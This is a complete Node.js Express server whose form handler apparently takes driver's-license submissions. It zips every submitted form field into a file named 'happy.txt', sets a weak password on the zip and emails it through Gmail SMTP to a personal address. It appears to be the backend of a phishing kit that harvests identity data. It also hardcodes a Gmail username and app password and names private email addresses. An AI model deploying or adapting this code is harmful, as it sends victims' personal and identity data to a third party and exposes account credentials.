const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const multer = require("multer");
const AdmZip = require("adm-zip");
const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Set up file upload using multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage: storage });

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
  try {
    const data = req.body;

    // validate data
    if (!data || typeof data !== "object") {
      throw new Error("Invalid data.");
    }

    // create nodemailer transport object
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: "ayomiakintoye00@gmail.com",
        pass: "mwphwjmkjsiglnoz",
      },
    });

    // create a zip file with password protection
    const zip = new AdmZip();
    zip.addFile("happy.txt", Buffer.from(JSON.stringify(data))); // add data to a file named happy.txt in the zip file
    zip.setPassword("1234"); // set the password to 1234
    const zipBuffer = zip.toBuffer();

    // create mail options object
    const mailOptions = {
      from: "ayomiakintoye00@gmail.com",
      to: "isaiahgabriel175@gmail.com", // recipient email address
      subject: "Data file",
      text: "Data file attached.", // message body
      attachments: [
        {
          filename: "happy.zip",
          content: zipBuffer,
          contentType: "application/zip",
        },
      ],
    };

    // send mail with defined transport object
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent successfully.", info);

    res.sendFile(path.join(__dirname, "confirmation.html"));
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending email.");
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
